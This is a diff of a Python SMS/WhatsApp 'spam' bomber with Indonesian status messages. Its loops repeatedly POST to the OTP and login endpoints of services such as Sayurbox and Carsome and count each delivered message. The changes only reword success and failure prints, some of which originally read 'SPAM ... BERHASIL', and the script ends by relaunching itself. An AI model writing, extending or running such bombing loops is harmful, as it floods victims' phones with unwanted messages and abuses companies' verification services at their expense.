@@ -161,7 +161,7 @@ for k in range(jumlah):
   if "success" in pos_eci:
     time.sleep(3)
     print(f"{H}____________________________________________")
-    print(f"{O}--> SELAMAT SMS ECI MASUK",k)
+    print(f"{O}--> SMS ECI MASUK",k)
   else:
     time.sleep(3)
     print(f"{H}____________________________________________")
@@ -172,33 +172,33 @@ for k in range(jumlah):
   if "200" in pos_qoala:
     time.sleep(3)
     print(f"{H}____________________________________________")
-    print(f"{O}--> SMS QOALA MASUK",k)
+    print(f"{O}--> WA QOALA MASUK",k)
   else:
     time.sleep(3)
     print(f"{H}____________________________________________")
-    print(f"{M}--> MAAF SMS QOALA GAGAL",k)
+    print(f"{M}--> MAAF WA QOALA GAGAL",k)
 for k in range(jumlah):
   k += 1
   pos_sayur = requests.post("https://www.sayurbox.com/graphql/v1?deduplicate=1",headers=headers_sayur,data=data_sayur).text
   if "__typename" in pos_sayur:
     time.sleep(3)
     print(f"{H}____________________________________________")
-    print(f"{O}--> SPAM SAYURBOX WA BERHASIL",k)
+    print(f"{O}--> WA SAYURBOX MASUK",k)
   else:
     time.sleep(3)
     print(f"{H}____________________________________________")
-    print(f"{M}--> SPAM SAYURBOX WA GAGAL",k)
+    print(f"{M}--> MAAF WA SAYURBOX GAGAL",k)
 for k in range(jumlah):
   k += 1
   pos_carsome = requests.post("https://www.carsome.id/website/login/sendSMS",headers=headers_carsome,data=data_carsome).text
   if "Send successfully" in pos_carsome:
     time.sleep(3)
     print(f"{H}____________________________________________")
-    print(f"{O}--> SPAM WA CARSOME BERHASIL",k)
+    print(f"{O}--> WA CARSOME MASUK",k)
   else:
     time.sleep(3)
     print(f"{H}____________________________________________")
-    print(f"{M}--> SPAM WA CARSOME GAGAL",k)
+    print(f"{M}--> MAAF WA CARSOME GAGAL",k)
     time.sleep(5)
 os.system("clear")
 os.system("python SWS.py")
